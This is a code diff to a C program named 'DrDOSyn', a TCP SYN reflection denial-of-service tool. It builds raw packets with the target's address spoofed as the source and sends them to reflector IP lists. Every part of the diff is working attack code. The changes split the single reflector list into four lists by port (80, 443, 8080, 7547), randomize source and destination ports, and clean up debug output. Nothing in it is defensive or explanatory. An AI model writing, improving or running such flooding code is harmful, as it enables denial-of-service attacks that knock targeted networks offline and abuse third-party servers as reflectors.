@@ -16,7 +16,7 @@
 #include <arpa/inet.h>
 #include <math.h>
 
-/*gcc -pthread drdCidr.c -o drdossyn -lm*/
+/*gcc drdMultiList.c -pthread -g3 -O2 -o drdo -lm*/
 
 #define MAX_PACKET_SIZE 4096
 #define PHI 0x9e3779b9
@@ -70,9 +70,12 @@ struct list *tail;
 struct thread_data
 {
 	int thread_id;
-	struct list *list_node;
 	struct sockaddr_in *sins;
 	unsigned long num_ips;
+	struct list *list_80;
+	struct list *list_443;
+	struct list *list_8080;
+	struct list *list_7547;
 	struct list *bpg_list_node;
 };
 
@@ -184,13 +187,13 @@ void setup_ip_header(struct iphdr *iph)
 	iph->saddr = inet_addr("0.0.0.0");
 }
 
-int sPorts[2] = {80, 443};
-int dPorts[3] = {80, 443};
+int sPorts[4] = {80, 443, 8080, 7547};
+int dPorts[5] = {80, 443, 8080, 7547}; /* Len = 4 plus floodport */
 int windows[4] = {8192, 65535, 14600, 64240};
 
 void setup_tcp_header(struct tcphdr *tcph)
 {
-	tcph->dest = htons(sPorts[rand_cmwc() % 2]);
+	tcph->dest = htons(sPorts[randnum(0, 4)]);
 	tcph->source = htons(floodport);
 	tcph->ack = 0;
 	tcph->ack_seq = randnum(10000, 99999);
@@ -258,7 +261,10 @@ void *flood(void *par1)
 	struct tcpOptions *opts = (void *)iph + sizeof(struct iphdr) + sizeof(struct tcphdr);
 
 	struct sockaddr_in *sins = td->sins;
-	struct list *list_node = td->list_node;
+	struct list *list_80 = td->list_80;
+	struct list *list_443 = td->list_443;
+	struct list *list_8080 = td->list_8080;
+	struct list *list_7547 = td->list_7547;
 	struct list *bpg_list_node = td->bpg_list_node;
 
 	int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
@@ -274,7 +280,7 @@ void *flood(void *par1)
 	setup_tcp_header(tcph);
 	setup_tcpopts_header(opts);
 	iph->saddr = sins[0].sin_addr.s_addr;
-	iph->daddr = list_node->data.sin_addr.s_addr;
+	iph->daddr = list_80->data.sin_addr.s_addr;
 	iph->check = csum((unsigned short *)datagram, iph->tot_len);
 
 	int tmp = 1;
@@ -330,16 +336,18 @@ void *flood(void *par1)
 		}
 		else
 		{
+			int drdossType = dPorts[randnum(0, 4)];
+
 			if (floodport == 0)
 			{
 				if (randnum(0, 1) == 1)
 				{
 					tcph->dest = htons(randnum(1, 65535));
-					tcph->source = htons(sPorts[rand_cmwc() % 2]);
+					tcph->source = htons(sPorts[randnum(0, 4)]);
 				}
 				else
 				{
-					tcph->dest = htons(sPorts[rand_cmwc() % 2]);
+					tcph->dest = htons(sPorts[randnum(0, 4)]);
 					tcph->source = htons(randnum(1, 65535));
 				}
 			}
@@ -348,24 +356,58 @@ void *flood(void *par1)
 				if (randnum(0, 1) == 1)
 				{
 					tcph->dest = htons(floodport);
-					tcph->source = htons(dPorts[rand_cmwc() % 3]);
+					tcph->source = htons(drdossType);
 				}
 				else
 				{
 					tcph->source = htons(floodport);
-					tcph->dest = htons(sPorts[rand_cmwc() % 2]);
+					tcph->dest = htons(sPorts[randnum(0, 4)]);
 				}
 			}
 			opts->mssvalue = htons(1360 + (rand_cmwc() % 100));
 			setup_tcpopts_header(opts);
 			tcph->doff = ((sizeof(struct tcphdr)) + sizeof(struct tcpOptions)) / 4;
-			list_node = list_node->next;
-			iph->daddr = list_node->data.sin_addr.s_addr;
-			iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpOptions);
-			tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpOptions));
-			iph->check = csum((unsigned short *)datagram, iph->tot_len);
-			tcph->ack_seq = randnum(10000, 99999);
-			sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_node->data, sizeof(list_node->data));
+
+			if (drdossType == 80)
+			{
+				list_80 = list_80->next;
+				iph->daddr = list_80->data.sin_addr.s_addr;
+				iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpOptions);
+				tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpOptions));
+				iph->check = csum((unsigned short *)datagram, iph->tot_len);
+				tcph->ack_seq = randnum(10000, 99999);
+				sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_80->data, sizeof(list_80->data));
+			}
+			else if (drdossType == 443)
+			{
+				list_443 = list_443->next;
+				iph->daddr = list_443->data.sin_addr.s_addr;
+				iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpOptions);
+				tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpOptions));
+				iph->check = csum((unsigned short *)datagram, iph->tot_len);
+				tcph->ack_seq = randnum(10000, 99999);
+				sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_443->data, sizeof(list_443->data));
+			}
+			else if (drdossType == 8080)
+			{
+				list_8080 = list_8080->next;
+				iph->daddr = list_8080->data.sin_addr.s_addr;
+				iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpOptions);
+				tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpOptions));
+				iph->check = csum((unsigned short *)datagram, iph->tot_len);
+				tcph->ack_seq = randnum(10000, 99999);
+				sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_8080->data, sizeof(list_8080->data));
+			}
+			else if (drdossType == 7547)
+			{
+				list_7547 = list_7547->next;
+				iph->daddr = list_7547->data.sin_addr.s_addr;
+				iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpOptions);
+				tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpOptions));
+				iph->check = csum((unsigned short *)datagram, iph->tot_len);
+				tcph->ack_seq = randnum(10000, 99999);
+				sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_7547->data, sizeof(list_7547->data));
+			}
 		}
 
 		// printf("Source IP: %s\n", inet_ntoa(*(struct in_addr *)&iph->saddr));
@@ -392,7 +434,7 @@ void extractIpOctets(const char *sourceString, short *ipAddress)
 	unsigned short len = 0;
 	unsigned char oct[4] = {0}, cnt = 0, cnt1 = 0, i, buf[5];
 
-	printf("Parsing IP: %s\n", sourceString);
+	/*printf("Parsing IP: %s\n", sourceString);*/
 	len = strlen(sourceString);
 	for (i = 0; i < len; i++)
 	{
@@ -411,9 +453,9 @@ void extractIpOctets(const char *sourceString, short *ipAddress)
 	ipAddress[1] = oct[1];
 	ipAddress[2] = oct[2];
 	ipAddress[3] = oct[3];
-	printf("Parsed octets: %d.%d.%d.%d\n",
+	/*printf("Parsed octets: %d.%d.%d.%d\n",
 		   ipAddress[0], ipAddress[1],
-		   ipAddress[2], ipAddress[3]); // Debug output
+		   ipAddress[2], ipAddress[3]); Debug output*/
 }
 
 unsigned int ip2ui(char *ip)
@@ -464,14 +506,14 @@ unsigned int createBitmask(const char *bitmask)
 }
 struct list *loadList(const char *filename, size_t max_len, int *out_count)
 {
-	printf("DEBUG: Entering loadList for file: %s\n", filename); // Debug 1
+	printf("[+] Entering loadList for file: %s\n", filename); // Debug 1
 	FILE *file = fopen(filename, "r");
 	if (!file)
 	{
 		fprintf(stderr, "Error opening file: %s\n", filename);
 		return NULL;
 	}
-	printf("DEBUG: File opened successfully\n"); // Debug 2
+	printf("[+] File opened successfully\n"); // Debug 2
 
 	struct list *head = NULL, *tail = NULL;
 	char buffer[128];
@@ -496,7 +538,7 @@ struct list *loadList(const char *filename, size_t max_len, int *out_count)
 		new_node->data.sin_addr.s_addr = inet_addr(buffer);
 		if (new_node->data.sin_addr.s_addr == INADDR_NONE)
 		{
-			printf("DEBUG: Invalid IP address: %s\n", buffer); // Debug 5
+			printf("[+] Invalid IP address: %s\n", buffer); // Debug 5
 			free(new_node);
 			continue;
 		}
@@ -522,21 +564,21 @@ struct list *loadList(const char *filename, size_t max_len, int *out_count)
 	fclose(file);
 	if (out_count)
 		*out_count = line_count;
-	printf("DEBUG: Loaded %d IPs from %s\n", line_count, filename); // Debug 8
+	printf("[+] Loaded %d IPs from %s\n", line_count, filename); // Debug 8
 	return head;
 }
 
 int main(int argc, char *argv[])
 {
-	if (argc < 8)
+	if (argc < 10)
 	{
 		fprintf(stdout, "DrDOSyn @cxmmand - netty\n");
-		fprintf(stdout, "Usage: %s [Target (1.1.1.1/24)] [Port] [Threads] [PPS] [Time] [Drdos List] [BGP List]\n", argv[0]);
+		fprintf(stdout, "Usage: %s [Target (1.1.1.1/24)] [Port] [Threads] [PPS] [Time] [List Port 80] [List Port 443] [List Port 8080] [List Port 7547] [BGP List]\n", argv[0]);
 		exit(-1);
 	}
 	srand(time(NULL));
 	fprintf(stdout, "Preparing...\n");
-	printf("DEBUG: Starting initialization\n"); // Debug 9
+	printf("[+] Starting initialization\n"); // Debug 9
 
 	int max_len = 128;
 	int i = 0;
@@ -551,16 +593,15 @@ int main(int argc, char *argv[])
 	pps = 0;
 	int count = 0;
 
-	printf("DEBUG: Before loading DRDoS list\n"); // Debug 10
-	list_t *current = loadList(argv[6], max_len, &count);
-	printf("DEBUG: After loading DRDoS list, count=%d\n", count); // Debug 11
+	list_t *list_80 = loadList(argv[6], max_len, &count);
+	list_t *list_443 = loadList(argv[7], max_len, &count);
+	list_t *list_8080 = loadList(argv[8], max_len, &count);
+	list_t *list_7547 = loadList(argv[9], max_len, &count);
 
-	printf("DEBUG: Before loading BGP list\n"); // Debug 12
-	bpg_list *bgpCurr = loadList(argv[7], max_len, &count);
-	printf("DEBUG: After loading BGP list, count=%d\n", count); // Debug 13
+	bpg_list *bgpCurr = loadList(argv[10], max_len, &count);
 
 	// Check if lists loaded successfully
-	if (!current || !bgpCurr)
+	if (!list_80 || !list_443 || !list_8080 || !list_7547 || !bgpCurr)
 	{
 		fprintf(stderr, "Failed to load one or both IP lists\n");
 		exit(-1);
@@ -598,7 +639,7 @@ int main(int argc, char *argv[])
 		num_ips *= 2;
 	}
 
-	printf("Number of IPs to reflect to: %ld \r\n", num_ips);
+	printf("[+] Number of IPs to reflect to: %ld \r\n", num_ips);
 	struct sockaddr_in *sins = malloc(num_ips * sizeof(struct sockaddr_in));
 	short network_octets[4], broadcast_octets[4];
 	extractIpOctets(networkAddress, network_octets);
@@ -615,7 +656,7 @@ int main(int argc, char *argv[])
 
 		char ipAddr[INET_ADDRSTRLEN];
 		inet_ntop(AF_INET, &addr, ipAddr, sizeof(ipAddr));
-		printf("%d: %s\n", ips + 1, ipAddr);
+		/*printf("%d: %s\n", ips + 1, ipAddr);*/
 		ips++;
 	}
 
@@ -627,7 +668,10 @@ int main(int argc, char *argv[])
 		td[i].thread_id = i;
 		td[i].sins = sins;
 		td[i].num_ips = ips;
-		td[i].list_node = current;	   // All threads start at head
+		td[i].list_80 = list_80; // All threads start at head
+		td[i].list_443 = list_443;
+		td[i].list_8080 = list_8080;
+		td[i].list_7547 = list_7547;
 		td[i].bpg_list_node = bgpCurr; // All threads start at head
 
 		if (pthread_create(&thread[i], NULL, &flood, (void *)&td[i]) != 0)
